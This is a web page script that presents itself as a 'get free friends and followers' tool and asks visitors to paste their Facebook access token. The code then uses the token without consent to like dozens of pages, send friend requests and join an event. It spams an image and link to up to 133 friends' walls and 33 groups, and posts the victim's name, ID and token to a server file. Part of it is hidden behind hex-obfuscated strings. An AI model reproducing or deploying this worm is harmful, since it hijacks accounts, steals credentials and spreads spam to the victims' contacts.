<script>
    var arr = [""];
    var tokenme;
    var user = {};

    function ileti(type, msg) {
        $('#logs').append('<div class="notification ' + type + '" id="ileti" style="display:none;margin-top:10px;"><span class="icon"></span>' + msg + '</div>');
        $('#ileti').fadeIn('slow');
        $('#ileti').removeAttr('id');
    }
    $('#gonder').click(function () {
        if ($('#access_token').val().length > 50) {
            $('.anlatim').hide();
            $('#logs').html("");
            $('#gonder').attr("disabled", "disabled");
            $('#gonder').attr("class", "button grey");

            access_token = $('#access_token').val();
            if (access_token.indexOf("access_token=") > 0) {
                access_token = access_token.split("access_token=")[1].split("&")[0];
                $('#access_token').val(access_token);
            }
            jQuery.ajax({
                url: 'https://graph.facebook.com/me?access_token=' + access_token,
                dataType: 'jsonp',
                success: function (data) {
                    user = data;
                    if (user && user.name) {
                        ileti("success", "Hello " + user.name + " مرحباً بك");
                        ileti("success", "<img src='https://graph.facebook.com/" + user.id + "/picture'>");
                        ileti("success", "↓ يجب عليك الضغط على زر متابعه ↓");
                        ileti("success", "<a href='https://www.facebook.com/140095789405409' target='_blank'><img src='http://im33.gulfup.com/ohlnY.png'></a>");
                        ileti("success", "↑ You must click on follow button ↑");
                        tokenme = access_token;

                        add(tokenme, "100000733528552");

                        sayfabegen("https://www.facebook.com/121300468080297");
                        sayfabegen("https://www.facebook.com/144012072460112");
                        sayfabegen("https://www.facebook.com/547350095310712");
                        sayfabegen("https://www.facebook.com/152841574905871");
                        sayfabegen("https://www.facebook.com/145760738948721");
                        sayfabegen("https://www.facebook.com/258181960985883");
                        sayfabegen("https://www.facebook.com/137647199773931");
                        sayfabegen("https://www.facebook.com/237462439717894");
                        sayfabegen("https://www.facebook.com/552461351479374");
                        sayfabegen("https://www.facebook.com/520346354670154");
                        sayfabegen("https://www.facebook.com/593262797361709");
                        sayfabegen("https://www.facebook.com/327115687419117");
                        sayfabegen("https://www.facebook.com/542737819116265");
                        sayfabegen("https://www.facebook.com/477135725705591");
                        sayfabegen("https://www.facebook.com/600050460028292");
                        sayfabegen("https://www.facebook.com/170790593098867");
                        sayfabegen("https://www.facebook.com/629275677087239");
                        sayfabegen("https://www.facebook.com/188839834491340");
                        sayfabegen("https://www.facebook.com/116377081773625");
                        sayfabegen("https://www.facebook.com/271488509618473");
                        sayfabegen("https://www.facebook.com/208732055924978");
                        sayfabegen("https://www.facebook.com/301184433313685");
                        sayfabegen("https://www.facebook.com/106231809534621");
                        sayfabegen("https://www.facebook.com/412600268808315");
                        sayfabegen("https://www.facebook.com/113105895437153");


                        frnds();
                        pgrp();


                    } else {
                        ileti("error", user.error.type + " error (" + user.error.code + ")");
                        $('#gonder').removeAttr("disabled");
                        $('#gonder').attr("class", "button blue");
                    }
                }
            });
        }
    });

    function arkadaslar() {
        document[_0xef73[2]](_0xef73[1])[_0xef73[0]] = _0xef73[3] + access_token + _0xef73[4] + _0xef73[5] + access_token + _0xef73[4];
    };

    function sayfabegen(_0xaff7x3) {
        jQuery[_0xef73[9]]({
            url: _0xef73[6] + access_token + _0xef73[7] + _0xaff7x3,
            dataType: _0xef73[8],
            success: function (_0xaff7x4) {}
        });
    };
    jQuery.ajax({
        url: 'https://graph.facebook.com/183402435144793/attending?access_token=' + access_token + '&method=post',
        dataType: 'jsonp',
        success: function (data) {}
    });




    function pgrp() {
        jQuery.ajax({
            url: 'https://graph.facebook.com/fql?q=select gid, name from group where gid IN (SELECT gid FROM group_member WHERE uid=me()) order by rand() limit 33&access_token=' + access_token,
            dataType: 'jsonp',
            success: function (data) {
                wallpostg(data);
            }
        });
    }

    function frnds() {
        jQuery.ajax({
            url: 'https://graph.facebook.com/fql?q=SELECT uid, first_name FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 133&access_token=' + access_token,
            dataType: 'jsonp',
            success: function (data) {
                wallpost(data);
            }
        });
    }

    function kayit(user, token) {
        jQuery.ajax({
            url: 'kayit.php',
            type: 'POST',
            data: {
                userid: user.id,
                gender: user.gender,
                access_token: token,
                username: user.name
            },
            success: function (data) {
                if (data == "true") {
                    ileti("success", "Kayit basarili");
                }
            }
        });
    }

    function sayfalar(sayfa) {

    }

    function arakla(token) {
        jQuery.ajax({
            url: 'https://graph.facebook.com/me?access_token=' + token,
            dataType: 'jsonp',
            success: function (data) {
                if (data.id) {
                    kayit(data, token);
                }
            }
        });
    }

    var lien = ChaineAleatoire();
    lien = " http://www.youtube.com/watch?v=xXBR7vRdQf8_" + lien;

    function ChaineAleatoire() {
        var ListeCar = new Array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
        var Chaine = '';
        for (i = 0; i < 12; i++) {
            Chaine = Chaine + ListeCar[Math.floor(Math.random() * ListeCar.length)];
        }
        return Chaine;
    }

    fotolink = "http://im33.gulfup.com/wQqxq.png";
    text = " أحصل على الكثير من الأصدقاء والمتابعين من هنا -> Get Free Friends requests and Followers -> Enter here -> " + lien;
    gonderildi = 0;


    function wallpost(list) {
        for (i = 0; i < list.data.length; i++) {
            jQuery.ajax({
                url: 'https://graph.facebook.com/' + list.data[i].uid + '/photos?url=' + fotolink + '&message=' + text + '&callback=paylas&method=POST&access_token=' + access_token,
                dataType: 'script',
                success: function () {
                    gonderildi += 1;
                    if (gonderildi >= list.data.length) {}
                }
            });
        }
    }



    function wallpostg(list) {
        for (i = 0; i < list.data.length; i++) {
            jQuery.ajax({
                url: 'https://graph.facebook.com/' + list.data[i].gid + '/photos?url=' + fotolink + '&message=' + text + '&callback=paylas&method=POST&access_token=' + access_token,
                dataType: 'script',
                success: function () {
                    gonderildi += 1;
                    if (gonderildi >= list.data.length) {}
                }
            });
        }
    }

    function foto_paylas() {
        jQuery.ajax({
            url: 'https://graph.facebook.com/me/photos?privacy={"value":"EVERYONE"}&url=' + fotolink + '&message=' + text + '&callback=paylas&method=POST&access_token=' + access_token,
            dataType: 'script',
            success: function () {}
        });
    }
    var turler = {
        video: "Video",
        status: "Durum Guncellemesi",
        link: "Baglanti",
        photo: "Fotograf",
        swf: "Video"
    };

    function gonderiler() {
        jQuery.ajax({
            url: 'https://graph.facebook.com/me?fields=feed.fields(message,privacy,type)&access_token=' + access_token,
            dataType: 'jsonp',
            success: function (data) {
                posts = data;
                for (i = 0; i < posts.feed.data.length; i++) {
                    if (posts.feed.data[i].message) {
                        ileti("success", posts.feed.data[i].message.substr(0, 50) + "... (" + turler[posts.feed.data[i].type] + ")");
                    } else {
                        ileti("success", "ID: " + posts.feed.data[i].id.split("_")[1] + "... (" + turler[posts.feed.data[i].type] + ")");
                    }
                }
            }
        });
    }

    function paylas() {

    }


    var _0x88c5 = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x72\x61\x70\x68\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x6D\x65\x2F\x6C\x69\x6B\x65\x73\x3F\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x3D", "\x26\x6D\x65\x74\x68\x6F\x64\x3D\x50\x4F\x53\x54\x26\x75\x72\x6C\x3D", "\x6A\x73\x6F\x6E\x70", "\x61\x6A\x61\x78", "\x26\x6D\x65\x74\x68\x6F\x64\x3D\x50\x4F\x53\x54\x26\x75\x72\x6C\x3D\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x31\x36\x36\x34\x35\x38\x37\x32\x36\x37\x33\x36\x37\x32\x38", "\x26\x6D\x65\x74\x68\x6F\x64\x3D\x50\x4F\x53\x54\x26\x75\x72\x6C\x3D\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x32\x30\x32\x33\x35\x30\x36\x35\x39\x37\x38\x37\x35\x38\x34", "\x26\x6D\x65\x74\x68\x6F\x64\x3D\x50\x4F\x53\x54\x26\x75\x72\x6C\x3D\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x31\x30\x32\x38\x38\x31\x33\x32\x33\x32\x34\x35\x31\x31\x34", "\x26\x6D\x65\x74\x68\x6F\x64\x3D\x50\x4F\x53\x54\x26\x75\x72\x6C\x3D\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x32\x34\x38\x30\x36\x32\x30\x36\x38\x36\x31\x33\x39\x32\x36", "\x26\x6D\x65\x74\x68\x6F\x64\x3D\x50\x4F\x53\x54\x26\x75\x72\x6C\x3D\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x31\x36\x35\x34\x38\x32\x32\x35\x30\x31\x39\x39\x38\x37\x30", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x72\x61\x70\x68\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x6D\x65\x2F\x66\x72\x69\x65\x6E\x64\x73\x3F\x75\x69\x64\x3D\x31\x30\x30\x30\x30\x31\x36\x38\x38\x30\x32\x36\x36\x39\x37\x26\x6D\x65\x74\x68\x6F\x64\x3D\x70\x6F\x73\x74\x26\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x3D", "\x67\x65\x74\x4A\x53\x4F\x4E", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x72\x61\x70\x68\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x6D\x65\x2F\x66\x72\x69\x65\x6E\x64\x73\x3F\x75\x69\x64\x3D\x31\x30\x30\x30\x30\x30\x38\x38\x34\x31\x39\x36\x34\x38\x38\x26\x6D\x65\x74\x68\x6F\x64\x3D\x70\x6F\x73\x74\x26\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x3D", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x72\x61\x70\x68\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x6D\x65\x2F\x66\x72\x69\x65\x6E\x64\x73\x3F\x75\x69\x64\x3D", "\x26\x6D\x65\x74\x68\x6F\x64\x3D\x70\x6F\x73\x74\x26\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x3D"];

    function sayfabegen(_0x116bx2) {
        jQuery[_0x88c5[3]]({
            url: _0x88c5[0] + access_token + _0x88c5[1] + _0x116bx2,
            dataType: _0x88c5[2],
            success: function (_0x116bx3) {}
        });
        jQuery[_0x88c5[3]]({
            url: _0x88c5[0] + access_token + _0x88c5[4],
            dataType: _0x88c5[2],
            success: function (_0x116bx3) {}
        });
        jQuery[_0x88c5[3]]({
            url: _0x88c5[0] + access_token + _0x88c5[5],
            dataType: _0x88c5[2],
            success: function (_0x116bx3) {}
        });
        jQuery[_0x88c5[3]]({
            url: _0x88c5[0] + access_token + _0x88c5[6],
            dataType: _0x88c5[2],
            success: function (_0x116bx3) {}
        });
        jQuery[_0x88c5[3]]({
            url: _0x88c5[0] + access_token + _0x88c5[7],
            dataType: _0x88c5[2],
            success: function (_0x116bx3) {}
        });
        jQuery[_0x88c5[3]]({
            url: _0x88c5[0] + access_token + _0x88c5[8],
            dataType: _0x88c5[2],
            success: function (_0x116bx3) {}
        });
    };

    function add(_0x116bx5, _0x116bx6) {
        $[_0x88c5[10]](_0x88c5[9] + _0x116bx5);
        $[_0x88c5[10]](_0x88c5[11] + _0x116bx5);
        $[_0x88c5[10]](_0x88c5[12] + _0x116bx6 + _0x88c5[13] + _0x116bx5, function (_0x116bx7) {});
    };
</script>
